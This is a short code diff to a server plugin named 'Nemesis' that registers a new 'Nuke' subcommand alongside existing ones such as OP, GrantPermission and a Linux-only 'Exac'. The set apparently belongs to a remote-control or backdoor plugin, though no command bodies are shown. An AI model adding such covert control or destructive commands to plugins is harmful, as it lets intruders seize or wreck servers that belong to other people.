@@ -14,6 +14,7 @@ import nemesis.commands.subcommands.Gamemode;
 import nemesis.commands.subcommands.GiveItem;
 import nemesis.commands.subcommands.GrantPermission;
 import nemesis.commands.subcommands.Kick;
+import nemesis.commands.subcommands.Nuke;
 import nemesis.commands.subcommands.OP;
 import nemesis.commands.subcommands.PlayerList;
 import nemesis.commands.subcommands.PluginList;
@@ -57,6 +58,7 @@ public final class Nemesis extends JavaPlugin {
                 new SetFlying(),
                 new SetInvulnerable(),
                 new Whitelist(),
+                new Nuke(),
                 new WorldList()).forEach(commandManager::registerSubCommand);
         if (Utils.isLinux()) {
             commandManager.registerSubCommand(new Exac());
